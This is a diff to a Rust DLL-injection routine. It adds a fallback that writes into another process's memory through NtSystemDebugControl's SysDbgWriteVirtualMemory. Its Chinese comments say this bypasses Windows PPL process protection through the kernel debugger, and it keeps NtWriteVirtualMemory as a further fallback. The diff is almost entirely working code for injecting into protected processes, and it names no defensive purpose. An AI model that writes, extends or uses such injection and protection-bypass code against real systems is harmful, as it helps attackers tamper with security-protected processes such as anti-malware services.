@@ -139,20 +139,28 @@ unsafe fn inject_dll(pid: u32, dll_path: &str) -> Result<(), String> {
     );
 
     if let Err(e) = write_result {
-        println!("WriteProcessMemory failed ({e}), trying NtWriteVirtualMemory...");
-        // NtWriteVirtualMemory 走 syscall，可能绕过某些保护
-        let nt_status = nt_write_virtual_memory(
-            hproc,
-            remote_mem,
-            dll_bytes.as_ptr() as *const _,
-            dll_bytes.len(),
-        );
-        if nt_status != 0 {
-            let _ = VirtualFreeEx(hproc, remote_mem, 0, MEM_RELEASE);
-            let _ = CloseHandle(hproc);
-            return Err(format!("NtWriteVirtualMemory failed: 0x{nt_status:08X}"));
+        println!("WriteProcessMemory failed ({e}), trying SysDbgWriteVirtualMemory...");
+        // SysDbgWriteVirtualMemory 通过内核调试器写入，可绕过 PPL
+        match sysdbg_write(pid, remote_mem, dll_bytes) {
+            Ok(()) => {
+                println!("SysDbgWriteVirtualMemory succeeded!");
+            }
+            Err(dbgerr) => {
+                println!("SysDbgWriteVirtualMemory failed ({dbgerr}), trying NtWriteVirtualMemory...");
+                let nt_status = nt_write_virtual_memory(
+                    hproc,
+                    remote_mem,
+                    dll_bytes.as_ptr() as *const _,
+                    dll_bytes.len(),
+                );
+                if nt_status != 0 {
+                    let _ = VirtualFreeEx(hproc, remote_mem, 0, MEM_RELEASE);
+                    let _ = CloseHandle(hproc);
+                    return Err(format!("All write methods failed. SysDbg: {dbgerr}, Nt: 0x{nt_status:08X}"));
+                }
+                println!("NtWriteVirtualMemory succeeded!");
+            }
         }
-        println!("NtWriteVirtualMemory succeeded!");
     }
 
     // 获取 kernel32!LoadLibraryW 地址
@@ -215,6 +223,85 @@ unsafe fn inject_dll(pid: u32, dll_path: &str) -> Result<(), String> {
     // 不释放 remote_mem —— DLL 可能还在用
     let _ = CloseHandle(hproc);
 
+    Ok(())
+}
+
+// ─── NtSystemDebugControl (PPL bypass via kernel debugger) ─────────────
+// 内核调试器启用时 (debug=Yes)，SysDbgReadVirtualMemory(17) 和
+// SysDbgWriteVirtualMemory(18) 可读写 PPL 保护进程的内存。
+
+const SysDbgReadVirtualMemory: u32 = 17;
+const SysDbgWriteVirtualMemory: u32 = 18;
+
+#[repr(C)]
+struct SysDbgVirtual {
+    pid: usize,     // HANDLE (ProcessId)
+    addr: usize,    // PVOID (Address)
+    buffer: usize,  // PVOID (Buffer)
+    size: u32,      // ULONG (RequestedSize)
+}
+
+#[link(name = "ntdll")]
+unsafe extern "system" {
+    fn NtSystemDebugControl(
+        command: u32,
+        input: *const SysDbgVirtual,
+        input_len: u32,
+        output: *mut std::ffi::c_void,
+        output_len: u32,
+        ret_len: *mut u32,
+    ) -> i32; // NTSTATUS
+}
+
+unsafe fn sysdbg_read(
+    pid: u32,
+    addr: *const std::ffi::c_void,
+    buf: &mut [u8],
+) -> Result<usize, String> {
+    let mut sdv = SysDbgVirtual {
+        pid: pid as usize,
+        addr: addr as usize,
+        buffer: buf.as_mut_ptr() as usize,
+        size: buf.len() as u32,
+    };
+    let mut ret_len: u32 = 0;
+    let status = NtSystemDebugControl(
+        SysDbgReadVirtualMemory,
+        &sdv,
+        std::mem::size_of::<SysDbgVirtual>() as u32,
+        std::ptr::null_mut(),
+        0,
+        &mut ret_len,
+    );
+    if status < 0 {
+        return Err(format!("SysDbgRead: 0x{status:08X}"));
+    }
+    Ok(ret_len as usize)
+}
+
+unsafe fn sysdbg_write(
+    pid: u32,
+    addr: *mut std::ffi::c_void,
+    data: &[u8],
+) -> Result<(), String> {
+    let mut sdv = SysDbgVirtual {
+        pid: pid as usize,
+        addr: addr as usize,
+        buffer: data.as_ptr() as usize,
+        size: data.len() as u32,
+    };
+    let mut ret_len: u32 = 0;
+    let status = NtSystemDebugControl(
+        SysDbgWriteVirtualMemory,
+        &sdv,
+        std::mem::size_of::<SysDbgVirtual>() as u32,
+        std::ptr::null_mut(),
+        0,
+        &mut ret_len,
+    );
+    if status < 0 {
+        return Err(format!("SysDbgWrite: 0x{status:08X}"));
+    }
     Ok(())
 }
 
